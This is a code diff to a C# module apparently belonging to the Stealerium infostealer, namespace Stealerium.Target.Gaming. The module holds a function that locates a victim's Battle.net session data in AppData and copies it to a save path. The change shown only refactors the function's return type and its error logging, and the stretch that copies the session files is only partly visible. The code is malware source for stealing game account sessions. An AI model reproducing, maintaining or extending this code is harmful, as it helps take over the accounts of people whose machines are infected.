@@ -9,10 +9,13 @@ namespace Stealerium.Target.Gaming
         private static readonly string Path = global::System.IO.Path.Combine(
             Paths.Appdata, "Battle.net");
 
-        public static bool GetBattleNetSession(string sSavePath)
+        public static void GetBattleNetSession(string sSavePath)
         {
             if (!Directory.Exists(Path))
-                return Logging.Log("BattleNET >> Session not found");
+            {
+                Logging.Log("BattleNET >> Session not found");
+                return;
+            }
 
             try
             {
@@ -40,7 +43,8 @@ namespace Stealerium.Target.Gaming
                         }
                         catch (Exception ex)
                         {
-                            return Logging.Log("BattleNET >> Failed copy file\n" + ex, false);
+                            Logging.Log("BattleNET >> Failed copy file\n" + ex, false);
+                            return;
                         }
                 }
 
@@ -48,10 +52,8 @@ namespace Stealerium.Target.Gaming
             }
             catch (Exception ex)
             {
-                return Logging.Log("BattleNET >> Error\n" + ex, false);
+                Logging.Log("BattleNET >> Error\n" + ex, false);
             }
-
-            return true;
         }
     }
 }
